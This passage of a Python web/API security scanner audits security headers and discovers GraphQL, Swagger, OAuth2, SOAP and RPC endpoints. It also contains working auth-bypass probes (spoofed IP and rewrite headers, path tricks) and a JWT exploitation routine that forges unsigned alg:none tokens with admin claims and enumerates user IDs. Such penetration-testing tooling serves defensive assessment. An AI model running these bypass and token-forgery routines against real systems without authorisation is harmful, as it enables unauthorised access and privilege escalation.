        "check_value": lambda v: v.lower().strip() in (
            "no-referrer", "same-origin", "strict-origin",
            "strict-origin-when-cross-origin", "no-referrer-when-downgrade"
        ),
        "bad_value_desc": "Weak referrer policy",
    },
    "Permissions-Policy": {
        "severity": "LOW",
        "desc": "Missing — no restrictions on browser features (camera, mic, etc.)",
        "check_value": lambda v: len(v) > 0,
        "bad_value_desc": "Empty policy",
    },
    "X-XSS-Protection": {
        "severity": "INFO",
        "desc": "Missing (deprecated but still checked by some scanners)",
        "check_value": lambda v: True,
        "bad_value_desc": "",
    },
    "Cache-Control": {
        "severity": "MEDIUM",
        "desc": "Missing on API — sensitive responses may be cached",
        "check_value": lambda v: any(d in v.lower() for d in ("no-store", "no-cache", "private")),
        "bad_value_desc": "API responses may be cached by intermediaries",
    },
}

HEADERS_LEAK = [
    "server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
    "x-generator", "x-drupal-cache", "x-varnish", "x-backend-server",
    "x-server", "x-host", "x-forwarded-server", "x-real-ip",
    "x-debug", "x-debug-token", "x-debug-token-link",
    "x-litespeed-cache", "x-turbo-charged-by", "x-pingback",
]


def headers_audit(base, session, timeout):
    print(f"\n  SECURITY HEADERS AUDIT")
    print(f"  {'─' * 55}")

    try:
        r = session.get(base + "/", timeout=timeout)
    except Exception as e:
        print(f"  ✗ Failed: {type(e).__name__}")
        return {}

    headers_lower = {k.lower(): v for k, v in r.headers.items()}
    findings = {"missing": [], "weak": [], "info_leak": [], "good": []}

    sev_icon = {"HIGH": "✗", "MEDIUM": "⚠", "LOW": "•", "INFO": "·"}

    for header, config in SECURITY_HEADERS.items():
        value = headers_lower.get(header.lower())
        sev = config["severity"]
        icon = sev_icon.get(sev, "•")

        if not value:
            findings["missing"].append((header, config["desc"], sev))
            print(f"  {icon} {header}")
            print(f"      MISSING — {config['desc']}")
        else:
            try:
                if config["check_value"](value):
                    findings["good"].append(header)
                else:
                    findings["weak"].append((header, value, config["bad_value_desc"], sev))
                    print(f"  {icon} {header}: {value[:60]}")
                    print(f"      WEAK — {config['bad_value_desc']}")
            except Exception:
                findings["good"].append(header)

    # Info leak headers
    leaked = []
    for h in HEADERS_LEAK:
        val = headers_lower.get(h)
        if val:
            leaked.append((h, val))

    if leaked:
        print(f"\n  Information Disclosure")
        print(f"  {'─' * 55}")
        for h, v in leaked:
            print(f"  · {h}: {v[:80]}")
            findings["info_leak"].append((h, v))

    good_count = len(findings["good"])
    total = len(SECURITY_HEADERS)
    print(f"\n  Score: {good_count}/{total} headers properly configured")

    return findings


# ── AUTH BYPASS PROBES ──

AUTH_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Forwarded-For": "0:0:0:0:0:0:0:1"},
]

AUTH_BYPASS_PATHS = [
    ("/admin", "Admin panel"),
    ("/admin/", "Admin panel (trailing slash)"),
    ("/api/admin", "API admin"),
    ("/api/v1/admin", "API v1 admin"),
    ("/internal", "Internal endpoint"),
    ("/api/internal", "API internal"),
    ("/debug", "Debug endpoint"),
    ("/console", "Console"),
    ("/management", "Management"),
    ("/actuator", "Spring Actuator"),
    ("/graphql", "GraphQL"),
    ("/api/users", "Users endpoint"),
    ("/api/v1/users", "Users v1"),
    ("/api/config", "Config endpoint"),
]

JWT_NONE_TOKEN = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
    "eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
)


def auth_bypass(base, session, timeout):
    print(f"\n  AUTH BYPASS PROBES")
    print(f"  {'─' * 55}")

    findings = []

    # Phase 1: Baseline — find paths that return 401/403
    protected = []
    print(f"  Scanning for protected endpoints...")
    for path, desc in AUTH_BYPASS_PATHS:
        try:
            r = session.get(base + path, timeout=timeout, allow_redirects=False)
            if r.status_code in (401, 403):
                protected.append((path, desc, r.status_code))
            elif r.status_code == 200:
                body = r.text[:500].lower()
                if "login" not in body and "unauthorized" not in body:
                    print(f"  ⚠ {path} → 200 (no auth required!)")
                    findings.append({"path": path, "type": "no_auth", "desc": f"{desc} accessible without auth"})
        except Exception:
            pass

    if not protected:
        print(f"  No protected endpoints found to test bypass on")

        # Still test header injection on root
        print(f"\n  Testing header injection on /...")
        try:
            baseline = session.get(base + "/", timeout=timeout)
            bl_code = baseline.status_code
            bl_size = len(baseline.content)

            for headers in AUTH_BYPASS_HEADERS:
                r = session.get(base + "/", headers=headers, timeout=timeout, allow_redirects=False)
                if r.status_code != bl_code or abs(len(r.content) - bl_size) > 50:
                    hname = list(headers.keys())[0]
                    print(f"  ⚠ {hname}: {headers[hname]} → {r.status_code} (baseline: {bl_code})")
                    findings.append({"path": "/", "type": "header_diff", "header": hname, "value": headers[hname]})
        except Exception:
            pass
    else:
        print(f"  Found {len(protected)} protected endpoints\n")

        for path, desc, orig_code in protected:
            print(f"  Testing: {path} (baseline: {orig_code})")

            # Header bypass
            for headers in AUTH_BYPASS_HEADERS:
                try:
                    r = session.get(base + path, headers=headers, timeout=timeout, allow_redirects=False)
                    if r.status_code == 200:
                        hname = list(headers.keys())[0]
                        print(f"    ✓ BYPASS with {hname}: {headers[hname]} → 200!")
                        findings.append({"path": path, "type": "header_bypass", "header": hname,
                                         "value": headers[hname], "orig": orig_code})
                    elif r.status_code not in (401, 403, orig_code):
                        hname = list(headers.keys())[0]
                        print(f"    ⚠ {hname} → {r.status_code} (different from {orig_code})")
                except Exception:
                    pass

            # Method override
            for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
                try:
                    r = session.request(method, base + path, timeout=timeout, allow_redirects=False)
                    if r.status_code == 200:
                        print(f"    ✓ BYPASS with {method} → 200!")
                        findings.append({"path": path, "type": "method_bypass", "method": method, "orig": orig_code})
                except Exception:
                    pass

            # Path tricks
            path_variants = [
                path + "/",
                path + "/.",
                path + "/..",
                path + "%20",
                path + "%09",
                path + "?",
                path + "#",
                path + ";",
                path.upper(),
                path + "..;/",
                "/" + path.lstrip("/").replace("/", "//"),
            ]
            for variant in path_variants:
                try:
                    r = session.get(base + variant, timeout=timeout, allow_redirects=False)
                    if r.status_code == 200:
                        print(f"    ✓ BYPASS with path: {variant} → 200!")
                        findings.append({"path": variant, "type": "path_bypass", "orig": orig_code})
                except Exception:
                    pass

    # Phase 2: JWT alg:none
    print(f"\n  JWT alg:none test...")
    for path, desc in [("/api/v1/users", ""), ("/api/admin", ""), ("/admin", ""), ("/", "")]:
        try:
            r = session.get(base + path, headers={
                "Authorization": f"Bearer {JWT_NONE_TOKEN}"
            }, timeout=timeout, allow_redirects=False)
            if r.status_code == 200:
                body = r.text[:200].lower()
                if "unauthorized" not in body and "invalid" not in body and "login" not in body:
                    print(f"  ✓ JWT none accepted on {path} → 200!")
                    findings.append({"path": path, "type": "jwt_none"})
        except Exception:
            pass

    # Phase 3: Empty/garbage auth
    print(f"  Empty auth test...")
    auth_tests = [
        ("No header", {}),
        ("Empty Bearer", {"Authorization": "Bearer "}),
        ("Bearer null", {"Authorization": "Bearer null"}),
        ("Basic admin:", {"Authorization": "Basic YWRtaW46"}),
        ("API key empty", {"X-API-Key": ""}),
        ("API key test", {"X-API-Key": "test"}),
    ]
    for label, headers in auth_tests:
        for path in ["/api/v1/users", "/api/admin", "/api/config"]:
            try:
                r = session.get(base + path, headers=headers, timeout=timeout, allow_redirects=False)
                if r.status_code == 200:
                    body = r.text[:200].lower()
                    if "unauthorized" not in body and "invalid" not in body:
                        print(f"  ⚠ {label} on {path} → 200")
                        findings.append({"path": path, "type": "weak_auth", "label": label})
            except Exception:
                pass

    if not findings:
        print(f"\n  No auth bypass found")
    else:
        print(f"\n  Found {len(findings)} potential bypass(es)")

    return findings


# ── JWT EXPLOITATION ──

JWT_EXPLOIT_PATHS = [
    "/", "/api", "/api/v1", "/api/v2", "/api/v1/users", "/api/v1/user",
    "/api/v1/me", "/api/v1/profile", "/api/v1/account", "/api/v1/admin",
    "/api/v1/config", "/api/v1/settings", "/api/v1/dashboard",
    "/api/users", "/api/user", "/api/me", "/api/profile", "/api/account",
    "/api/admin", "/api/config", "/api/settings",
    "/users", "/user", "/me", "/profile", "/account", "/admin",
    "/dashboard", "/settings", "/config", "/data", "/internal",
    "/v1/users", "/v1/me", "/v1/account", "/v2/users", "/v2/me",
]


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def forge_jwt(header_dict, payload_dict):
    header = b64url_encode(json.dumps(header_dict))
    payload = b64url_encode(json.dumps(payload_dict))
    return f"{header}.{payload}."


def decode_jwt(token):
    parts = token.split(".")
    if len(parts) < 2:
        return None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def jwt_exploit(base, session, timeout):
    print(f"\n  JWT EXPLOITATION")
    print(f"  {'─' * 55}")

    findings = []
    iat = int(time.time())
    exp = iat + 86400

    def is_auth_error(resp):
        body = resp.text[:400].lower()
        auth_keywords = ("unauthorized", "invalid token", "forbidden", "login", "access denied", "auth")
        return resp.status_code in (401, 403) or any(k in body for k in auth_keywords)

    def response_fingerprint(resp):
        return (resp.status_code, len(resp.content), hashlib.md5(resp.content).hexdigest())

    # ── Phase 1: strict auth-state delta detection ──
    print(f"  Phase 1: Finding protected endpoints with auth-state delta...")

    candidate_endpoints = []
    invalid_token = "invalid.invalid.invalid"
    test_token = forge_jwt({"alg": "none", "typ": "JWT"}, {"sub": "1", "role": "user", "iat": iat})

    for path in JWT_EXPLOIT_PATHS:
        try:
            r_no_auth = session.get(base + path, timeout=timeout, allow_redirects=False)
            r_invalid = session.get(
                base + path,
                headers={"Authorization": f"Bearer {invalid_token}"},
                timeout=timeout,
                allow_redirects=False,
            )
            r_none = session.get(
                base + path,
                headers={"Authorization": f"Bearer {test_token}"},
                timeout=timeout,
                allow_redirects=False,
            )
        except Exception:
            continue

        no_auth_protected = is_auth_error(r_no_auth)
        invalid_protected = is_auth_error(r_invalid)
        none_looks_auth = (not is_auth_error(r_none)) and r_none.status_code == 200

        # Only accept endpoints where forged none clearly improves auth state
        if (no_auth_protected or invalid_protected) and none_looks_auth:
            candidate_endpoints.append({
                "path": path,
                "no_auth": r_no_auth.status_code,
                "invalid": r_invalid.status_code,
                "none": r_none.status_code,
                "no_auth_fp": response_fingerprint(r_no_auth),
                "invalid_fp": response_fingerprint(r_invalid),
                "none_fp": response_fingerprint(r_none),
                "none_body": r_none.text[:500],
            })
            print(
                f"  ✓ {path}  no-auth:{r_no_auth.status_code} / invalid:{r_invalid.status_code} "
                f"→ none:{r_none.status_code}"
            )

    if not candidate_endpoints:
        print("  No protected endpoints accepted forged JWT (alg:none).")
        print("  Skipping exploit phases to avoid false positives.")
        return findings

    # ── Phase 2: Algorithm confusion attacks ──
    print(f"\n  Phase 2: Algorithm confusion attacks (protected endpoints only)...")

    alg_attacks = [
        ("none",  {"alg": "none", "typ": "JWT"}),
        ("None",  {"alg": "None", "typ": "JWT"}),
        ("NONE",  {"alg": "NONE", "typ": "JWT"}),
        ("nOnE",  {"alg": "nOnE", "typ": "JWT"}),
        ("none+strip", {"alg": "none"}),
        ("HS256 empty sig", {"alg": "HS256", "typ": "JWT"}),
    ]

    for ep in candidate_endpoints[:8]:
        path = ep["path"]
        print(f"\n  Target: {path} (baseline protected)")

        for label, header in alg_attacks:
            payload = {"sub": "1", "role": "admin", "iat": iat, "exp": exp}
            token = forge_jwt(header, payload)

            if label == "HS256 empty sig":
                h = b64url_encode(json.dumps(header))
                p = b64url_encode(json.dumps(payload))
                token = f"{h}.{p}."

            try:
                r = session.get(base + path, headers={
                    "Authorization": f"Bearer {token}"
                }, timeout=timeout, allow_redirects=False)

                accepted = (r.status_code == 200 and not is_auth_error(r))
                if accepted:
                    print(f"    ✓ alg:{label} → 200 ACCEPTED!")
                    findings.append({
                        "type": "alg_confusion",
                        "alg": label,
                        "path": path,
                        "status": 200,
                        "baseline": {
                            "no_auth": ep["no_auth"],
                            "invalid_token": ep["invalid"],
                        },
                    })
                else:
                    print(f"    ✗ alg:{label} → {r.status_code}")
            except Exception:
                pass

    # ── Phase 3: Claim manipulation ──
    print(f"\n  Phase 3: Claim manipulation (privilege escalation)...")

    claim_sets = [
        ("admin role",      {"sub": "1", "role": "admin", "iat": iat, "exp": exp}),
        ("admin=true",      {"sub": "1", "admin": True, "is_admin": True, "iat": iat, "exp": exp}),
        ("superadmin",      {"sub": "1", "role": "superadmin", "group": "administrators", "iat": iat, "exp": exp}),
        ("user_id=0",       {"sub": "0", "user_id": 0, "role": "admin", "iat": iat, "exp": exp}),
        ("user_id=-1",      {"sub": "-1", "user_id": -1, "role": "admin", "iat": iat, "exp": exp}),
        ("email=admin",     {"sub": "1", "email": "admin@admin.com", "role": "admin", "iat": iat, "exp": exp}),
        ("permissions *",   {"sub": "1", "permissions": ["*"], "scope": "admin", "iat": iat, "exp": exp}),
        ("internal svc",    {"sub": "internal-service", "role": "service", "iss": "internal", "iat": iat, "exp": exp}),
    ]

    none_header = {"alg": "none", "typ": "JWT"}

    for ep in candidate_endpoints[:8]:
        path = ep["path"]
        baseline_fp = ep["none_fp"]

        for label, payload in claim_sets:
            token = forge_jwt(none_header, payload)
            try:
                r = session.get(base + path, headers={
                    "Authorization": f"Bearer {token}"
                }, timeout=timeout, allow_redirects=False)

                if r.status_code == 200 and not is_auth_error(r):
                    current_fp = response_fingerprint(r)
                    if current_fp != baseline_fp:
                        diff = abs(current_fp[1] - baseline_fp[1])
                        print(f"    ✓ {label} on {path} → 200 (Δ{diff}b — different data!)")
                        findings.append({
                            "type": "claim_escalation", "claims": label,
                            "path": path, "status": 200, "body_diff": diff,
                        })
                    else:
                        print(f"    · {label} on {path} → 200 (same response)")
            except Exception:
                pass

    # ── Phase 4: User ID enumeration ──
    print(f"\n  Phase 4: User ID enumeration...")

    for ep in candidate_endpoints[:5]:
        path = ep["path"]
        unique_bodies = set()

        for uid in ["0", "1", "2", "3", "100", "999", "admin", "root", "test"]:
            token = forge_jwt(none_header, {
                "sub": uid, "user_id": uid, "iat": iat, "exp": exp
            })
            try:
                r = session.get(base + path, headers={
                    "Authorization": f"Bearer {token}"
                }, timeout=timeout, allow_redirects=False)

                if r.status_code == 200 and not is_auth_error(r):
                    body_hash = hashlib.md5(r.content).hexdigest()
                    is_new = body_hash not in unique_bodies
                    unique_bodies.add(body_hash)

                    if is_new and len(unique_bodies) > 1:
                        body_preview = r.text[:100].replace("\n", " ")
                        print(f"    ✓ sub={uid} on {path} → unique response")
                        print(f"      {body_preview[:80]}...")
                        findings.append({
                            "type": "user_enum", "user_id": uid,
                            "path": path, "body_hash": body_hash,
                        })
            except Exception:
                pass

        if len(unique_bodies) > 1:
            print(f"    ⚠ {len(unique_bodies)} unique responses — possible IDOR via JWT sub claim!")
        else:
            print(f"    · All responses identical on {path}")

    # ── Phase 5: Token in response ──
    print(f"\n  Phase 5: Checking for tokens in responses...")

    token_keywords = ["access_token", "accesstoken", "token", "jwt", "bearer",
                      "refresh_token", "id_token", "auth_token", "session",
                      "api_key", "apikey", "secret"]

    for ep in candidate_endpoints[:8]:
        path = ep["path"]
        try:
            r = session.get(base + path, headers={
                "Authorization": f"Bearer {test_token}"
            }, timeout=timeout, allow_redirects=False)

            if r.status_code == 200 and not is_auth_error(r):
                body = r.text[:2000].lower()
                for kw in token_keywords:
                    if kw in body:
                        idx = body.index(kw)
                        snippet = r.text[max(0, idx-5):idx+60].replace("\n", " ")
                        print(f"    ⚠ '{kw}' found in response on {path}")
                        print(f"      ...{snippet}...")
                        findings.append({
                            "type": "token_leak", "keyword": kw,
                            "path": path, "snippet": snippet,
                        })
                        break
        except Exception:
            pass

    # ── Summary ──
    print(f"\n  JWT Exploitation Summary")
    print(f"  {'─' * 55}")

    if not findings:
        print(f"  No exploitable JWT issues found")
    else:
        by_type = {}
        for f in findings:
            t = f["type"]
            if t not in by_type:
                by_type[t] = []
            by_type[t].append(f)

        type_labels = {
            "alg_confusion": "Algorithm Confusion",
            "claim_escalation": "Privilege Escalation",
            "user_enum": "User Enumeration (IDOR)",
            "token_leak": "Token Leakage",
        }

        print(f"  Total findings: {len(findings)}\n")
        for ftype, items in by_type.items():
            label = type_labels.get(ftype, ftype)
            print(f"  ⚠ {label}: {len(items)}")
            for item in items[:5]:
                path = item.get("path", "")
                detail = item.get("alg") or item.get("claims") or item.get("user_id") or item.get("keyword") or ""
                print(f"      → {path}  [{detail}]")

    return findings


# ── GRAPHQL INTROSPECTION ──

GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/graphiql", "/graphql/console",
    "/v1/graphql", "/v2/graphql", "/api/graphql", "/api/v1/graphql",
    "/query", "/gql", "/playground",
]

SWAGGER_PATHS = [
    "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
    "/v2/swagger.json", "/v3/openapi.json",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/openapi.json", "/openapi/v1/openapi.json", "/openapi/v2/openapi.json",
    "/api-docs/swagger.json", "/api/swagger.json",
    "/actuator/openapi",
]

OAUTH2_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/.well-known/jwks.json",
    "/oauth2/.well-known/openid-configuration",
    "/oidc/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
]

SOAP_PATHS = [
    "/wsdl", "/?wsdl", "/services", "/soap", "/soap11", "/soap12",
    "/Service.asmx", "/service.asmx", "/api/soap",
]

JSONRPC_PATHS = [
    "/rpc", "/jsonrpc", "/api/rpc", "/api/jsonrpc",
    "/v1/rpc", "/v2/rpc", "/xmlrpc", "/api/xmlrpc",
]

ASYNCAPI_PATHS = [
    "/asyncapi.json", "/asyncapi.yaml",
    "/api/asyncapi.json", "/docs/asyncapi.json",
]

WEBSOCKET_PATHS = [
    "/ws", "/socket", "/websocket", "/realtime", "/live", "/stream",
    "/api/ws", "/api/socket", "/api/v1/ws",
]

INTROSPECTION_QUERY = json.dumps({
    "query": """
    {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            type { name kind ofType { name kind } }
            args { name type { name kind } }
          }
        }
        directives { name description locations }
      }
    }
    """
})

INTROSPECTION_SUGGESTIONS = json.dumps({
    "query": "{ __type(name: \"Query\") { name fields { name type { name } } } }"
})


def swagger_check(base, session, timeout):
    """Discover and parse Swagger/OpenAPI specs, extract endpoints."""
    print(f"\n  SWAGGER / OPENAPI DISCOVERY")
    print(f"  {'─' * 55}")

    findings = {"specs": [], "endpoints": [], "paths": [], "version": None}

    for path in SWAGGER_PATHS:
        url = base.rstrip("/") + path
        try:
            r = session.get(url, timeout=timeout)
            if r.status_code != 200:
                continue

            ctype = (r.headers.get("Content-Type") or "").lower()
            body = r.text

            # Try JSON
            spec = None
            if "json" in ctype or body.strip().startswith("{"):
                try:
                    spec = r.json()
                except (json.JSONDecodeError, ValueError):
                    continue

            # Try YAML (optional)
            if spec is None and ("yaml" in ctype or body.strip().startswith("---") or (":" in body and not body.strip().startswith("{"))):
                try:
                    import yaml
                    spec = yaml.safe_load(body)
                except ImportError:
                    pass
                except Exception:
                    pass

            if not spec or not isinstance(spec, dict):
                continue

            # Swagger 2.0 or OpenAPI 3.x
            swagger_version = spec.get("swagger") or spec.get("openapi")
            if not swagger_version:
                continue

            findings["version"] = swagger_version
            findings["specs"].append({"url": url, "path": path, "version": swagger_version})
            print(f"  ✓ Spec found: {path} ({swagger_version})")

            # Extract base path (Swagger 2.0)
            base_path = spec.get("basePath", "") or ""
            if base_path and not base_path.startswith("/"):
                base_path = "/" + base_path

            # Extract paths
            paths_obj = spec.get("paths", {})
            if not paths_obj:
                continue

            for path_template, path_item in paths_obj.items():
                if not isinstance(path_item, dict):
                    continue
                full_path = base_path.rstrip("/") + "/" + path_template.lstrip("/")
                methods = [m.upper() for m in path_item.keys() if m.upper() in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS")]
                for method in methods:
                    ep = {"method": method, "path": full_path, "spec_path": path_template}
                    op = path_item.get(method.lower(), {})
                    if isinstance(op, dict):
                        ep["summary"] = op.get("summary") or op.get("description", "")[:80]
                        ep["tags"] = op.get("tags", [])
                        params = op.get("parameters", [])
                        if params:
                            ep["params"] = [p.get("name") for p in params if isinstance(p, dict) and p.get("name")]
                    findings["endpoints"].append(ep)
                    findings["paths"].append(f"{method} {full_path}")

            # Dedupe paths for display
            seen_eps = set()
            unique_eps = []
            for ep in findings["endpoints"]:
                key = (ep["method"], ep["path"])
                if key not in seen_eps:
                    seen_eps.add(key)
                    unique_eps.append(ep)

            print(f"\n  Endpoints ({len(unique_eps)})")
            print(f"  {'─' * 55}")
            for ep in unique_eps[:30]:
                summary = f" — {ep.get('summary', '')[:40]}" if ep.get("summary") else ""
                print(f"    {ep['method']:6} {ep['path']}{summary}")
            if len(unique_eps) > 30:
                print(f"    ... and {len(unique_eps) - 30} more")

            return findings

        except requests.exceptions.RequestException:
            continue
        except Exception as e:
            if __debug__:
                print(f"  ✗ {path}: {type(e).__name__}")
            continue

    print(f"  No Swagger/OpenAPI specs found")
    return findings


def oauth2_check(base, session, timeout):
    """Discover OAuth2/OIDC discovery endpoints and extract auth URLs."""
    print(f"\n  OAUTH2 / OIDC DISCOVERY")
    print(f"  {'─' * 55}")

    findings = {"endpoints": [], "issuer": None, "auth_url": None, "token_url": None, "jwks_uri": None}

    for path in OAUTH2_PATHS:
        url = base.rstrip("/") + path
        try:
            r = session.get(url, timeout=timeout)
            if r.status_code != 200:
                continue
            try:
                data = r.json()
            except (json.JSONDecodeError, ValueError):
                continue
            if not isinstance(data, dict):
                continue

            findings["endpoints"].append({"url": url, "path": path})
            findings["issuer"] = data.get("issuer")
            findings["auth_url"] = data.get("authorization_endpoint")
            findings["token_url"] = data.get("token_endpoint")
            findings["jwks_uri"] = data.get("jwks_uri")
            findings["userinfo"] = data.get("userinfo_endpoint")
            findings["scopes"] = data.get("scopes_supported", [])

            print(f"  ✓ OAuth2/OIDC found: {path}")
            if findings["issuer"]:
                print(f"    Issuer: {findings['issuer']}")
            if findings["auth_url"]:
                print(f"    Authorization: {findings['auth_url']}")
            if findings["token_url"]:
                print(f"    Token: {findings['token_url']}")
            if findings["jwks_uri"]:
                print(f"    JWKS: {findings['jwks_uri']}")
            return findings
        except Exception:
            continue

    print(f"  No OAuth2/OIDC discovery found")
    return findings


def soap_check(base, session, timeout):
    """Discover SOAP/WSDL endpoints and extract operations."""
    print(f"\n  SOAP / WSDL DISCOVERY")
    print(f"  {'─' * 55}")

    findings = {"endpoints": [], "operations": [], "services": []}

    for path in SOAP_PATHS:
        url = base.rstrip("/") + path
        try:
            r = session.get(url, timeout=timeout)
            if r.status_code != 200:
                continue
            body = r.text.lower()
            if "wsdl" not in body and "soap" not in body and "xmlns" not in body:
                continue

            findings["endpoints"].append({"url": url, "path": path})
            print(f"  ✓ SOAP/WSDL found: {path}")

            # Extract service/port names (basic)
            services = re.findall(r'name=["\']([^"\']+)["\']', r.text)
            operations = re.findall(r'<operation\s+name=["\']([^"\']+)["\']', r.text, re.I)
            bindings = re.findall(r'<binding\s+name=["\']([^"\']+)["\']', r.text, re.I)
            if operations:
                findings["operations"] = list(set(operations))[:20]
                print(f"    Operations: {', '.join(findings['operations'][:8])}")
                if len(findings["operations"]) > 8:
                    print(f"    ... and {len(findings['operations']) - 8} more")
            if bindings:
                findings["services"] = list(set(bindings))[:10]
            return findings
        except Exception:
            continue

    print(f"  No SOAP/WSDL found")
    return findings


def websocket_check(base, session, timeout):
    """Detect WebSocket endpoints via Upgrade header check."""
    print(f"\n  WEBSOCKET DETECTION")
    print(f"  {'─' * 55}")

    findings = {"endpoints": []}

    for path in WEBSOCKET_PATHS:
        url = base.rstrip("/").replace("https://", "wss://").replace("http://", "ws://") + path
        http_url = base.rstrip("/") + path
        try:
            r = session.get(http_url, timeout=timeout, headers={"Upgrade": "websocket", "Connection": "Upgrade"})
            upgrade = (r.headers.get("Upgrade") or "").lower()
            connection = (r.headers.get("Connection") or "").lower()
            if "websocket" in upgrade or ("upgrade" in connection and r.status_code in (101, 200, 400, 426)):
                findings["endpoints"].append({"path": path, "ws_url": url})
                print(f"  ✓ WebSocket likely: {path} → {url}")
        except Exception:
            continue

    if not findings["endpoints"]:
        print(f"  No WebSocket endpoints detected")
    return findings


def jsonrpc_check(base, session, timeout):
    """Discover JSON-RPC / XML-RPC endpoints."""
    print(f"\n  JSON-RPC / XML-RPC DISCOVERY")
    print(f"  {'─' * 55}")

    findings = {"endpoints": [], "methods": []}

    jsonrpc_body = json.dumps({"jsonrpc": "2.0", "method": "system.listMethods", "id": 1})
    xmlrpc_body = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

    for path in JSONRPC_PATHS:
        url = base.rstrip("/") + path
        try:
            # Try JSON-RPC
            r = session.post(url, data=jsonrpc_body, headers={"Content-Type": "application/json"}, timeout=timeout)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "result" in data or "error" in data:
                        findings["endpoints"].append({"path": path, "type": "jsonrpc"})
                        print(f"  ✓ JSON-RPC found: {path}")
                        if isinstance(data.get("result"), list):
                            findings["methods"] = data["result"][:15]
                            print(f"    Methods: {', '.join(findings['methods'][:5])}...")
                        return findings
                except (json.JSONDecodeError, ValueError):
                    pass

            # Try XML-RPC
            r = session.post(url, data=xmlrpc_body, headers={"Content-Type": "text/xml"}, timeout=timeout)
            if r.status_code == 200 and ("methodResponse" in r.text or "params" in r.text):
                findings["endpoints"].append({"path": path, "type": "xmlrpc"})
                print(f"  ✓ XML-RPC found: {path}")
                return findings
        except Exception:
            continue

    print(f"  No JSON-RPC/XML-RPC found")
    return findings


def asyncapi_check(base, session, timeout):
    """Discover AsyncAPI specs (event-driven APIs)."""
    print(f"\n  ASYNCAPI DISCOVERY")
    print(f"  {'─' * 55}")

    findings = {"specs": [], "channels": [], "version": None}

    for path in ASYNCAPI_PATHS:
        url = base.rstrip("/") + path
        try:
            r = session.get(url, timeout=timeout)
            if r.status_code != 200:
                continue

            spec = None
            body = r.text
            if "json" in (r.headers.get("Content-Type") or "").lower() or body.strip().startswith("{"):
                try:
                    spec = r.json()
                except (json.JSONDecodeError, ValueError):
                    continue
            elif "yaml" in (r.headers.get("Content-Type") or "").lower() or body.strip().startswith("---"):
                try:
                    import yaml
                    spec = yaml.safe_load(body)
                except ImportError:
                    continue
                except Exception:
                    continue

            if not spec or not isinstance(spec, dict):
                continue
            if "asyncapi" not in spec:
                continue

            findings["version"] = spec.get("asyncapi")
            findings["specs"].append({"url": url, "path": path})
            channels = spec.get("channels", {})
            if channels:
                findings["channels"] = list(channels.keys())[:20]
            print(f"  ✓ AsyncAPI found: {path} ({findings['version']})")
            if findings["channels"]:
                print(f"    Channels: {', '.join(findings['channels'][:5])}")
            return findings
        except Exception:
            continue

    print(f"  No AsyncAPI specs found")
    return findings


def graphql_check(
    base,
    session,
    timeout,
    processes=1,
    user_agent="Mozilla/5.0",
    probe_timeout=4,
    max_endpoints=1,
):
    print(f"\n  GRAPHQL INTROSPECTION")
    print(f"  {'─' * 55}")

    findings = {"endpoints": [], "introspection": None, "types": [], "mutations": [], "queries": []}

    # Phase 1: Find GraphQL endpoints
    gql_endpoints = []
    effective_probe_timeout = min(timeout, max(1, int(probe_timeout)))
    seen = set()
    if processes and processes > 1:
        try:
            with ThreadPoolExecutor(max_workers=processes) as executor:
                future_to_path = {
                    executor.submit(
                        _probe_graphql_path_worker,
                        base,
                        path,
                        effective_probe_timeout,
                        user_agent,
                    ): path
                    for path in GRAPHQL_PATHS
                }
                for future in as_completed(future_to_path):
                    try:
                        result = future.result()
                    except Exception:
                        continue
                    if not result:
                        continue
                    path = result["path"]
                    if path in seen:
                        continue
                    seen.add(path)
                    gql_endpoints.append(path)
                    print(f"  ✓ GraphQL found ({result['method']}): {path}")
                    if max_endpoints and len(gql_endpoints) >= max_endpoints:
                        break
        except Exception as e:
            print(f"  ⚠ Concurrent fallback to single worker ({type(e).__name__})")

    if not gql_endpoints:
        for path in GRAPHQL_PATHS:
            try:
                r = session.post(base + path,
                                 json={"query": "{ __typename }"},
                                 headers={"Content-Type": "application/json"},
                                 timeout=effective_probe_timeout)
                body = r.text[:1000].lower()
                if r.status_code == 200 and ("__typename" in body or "data" in body or "errors" in body):
                    if path not in seen:
                        seen.add(path)
                        gql_endpoints.append(path)
                        print(f"  ✓ GraphQL found (POST): {path}")
                        if max_endpoints and len(gql_endpoints) >= max_endpoints:
                            break
                    continue
            except Exception:
                pass

            try:
                r = session.get(base + path, params={"query": "{ __typename }"}, timeout=effective_probe_timeout)
                body = r.text[:1000].lower()
                if r.status_code == 200 and ("__typename" in body or "data" in body or "errors" in body):
                    if path not in seen:
                        seen.add(path)
                        gql_endpoints.append(path)
                        print(f"  ✓ GraphQL found (GET): {path}")
